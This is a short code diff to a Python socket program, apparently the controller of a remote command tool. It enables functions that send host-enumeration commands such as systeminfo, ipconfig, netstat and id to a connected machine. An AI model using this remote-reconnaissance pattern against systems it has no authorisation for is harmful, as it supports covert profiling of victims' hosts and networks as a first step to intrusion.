@@ -20,10 +20,23 @@ def connect():
 
     return serverSocket, connectionSocket
 
-#def setup_windows(connectionSocket):
+def setup_windows(connectionSocket):
+    connectionSocket.send("systeminfo".encode(encoding='latin-1'))
+    connectionSocket.send("ipconfig".encode(encoding='latin-1'))
+    connectionSocket.send("getmac".encode(encoding='latin-1'))
+    connectionSocket.send("netstat -p TCP".encode(encoding='latin-1'))
+    connectionSocket.send("netstat -p UDP".encode(encoding='latin-1'))
 
 
-#def setup_Linux(connectionSocket):
+
+def setup_Linux(connectionSocket):
+    connectionSocket.send("lshw".encode(encoding='latin-1'))
+    connectionSocket.send("lscpu".encode(encoding='latin-1'))
+    connectionSocket.send("ifconfig".encode(encoding='latin-1'))
+    connectionSocket.send("netstat -t".encode(encoding='latin-1'))
+    connectionSocket.send("netstat -u".encode(encoding='latin-1'))
+    connectionSocket.send("id".encode(encoding='latin-1'))
+
 
 
 def setup(connectionSocket):
